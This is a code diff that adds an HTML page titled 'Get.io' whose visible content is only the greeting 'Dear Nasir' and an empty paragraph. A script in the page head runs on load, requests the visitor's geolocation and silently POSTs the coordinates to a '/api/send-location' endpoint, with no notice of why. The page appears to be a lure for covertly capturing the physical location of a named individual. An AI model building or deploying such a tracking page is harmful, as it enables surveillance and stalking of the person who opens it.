@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Get.io</title>
+  <script>
+    window.onload = function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          fetch('/api/send-location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude
+            })
+          });
+        }, function(error) {
+          console.error('Error getting location', error);
+        });
+      } else {
+        console.log('Geolocation not supported');
+      }
+    };
+  </script>
+</head>
+<body>
+  <h1>Dear Nasir</h1>
+  <p></p>
+</body>
+</html>
